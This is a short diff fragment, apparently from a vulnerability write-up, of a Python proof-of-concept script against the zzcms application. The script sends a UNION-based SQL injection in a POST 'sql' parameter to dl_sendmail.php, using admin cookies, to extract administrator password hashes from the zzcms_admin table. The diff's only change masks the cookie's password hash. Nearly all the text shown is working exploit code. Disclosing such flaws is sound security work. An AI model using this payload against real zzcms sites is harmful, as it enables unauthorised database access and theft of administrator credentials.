@@ -11,7 +11,7 @@ According to the code, the SQL statement is submitted as a post, and there is no
 import requests
 
 url = "http://10.10.10.39:8080/dl/dl_sendmail.php"
-cookies = {'UserName':'admin','PassWord':'21232f297a57a5a743894a0e4a801fc3'}
+cookies = {'UserName':'admin','PassWord':'21232f29*****801fc3'}
 data = { 'sql':'select email from zzcms_dl where id=-1 union select pass from zzcms_admin #'}
 
 q = requests.post(url,data,cookies=cookies)
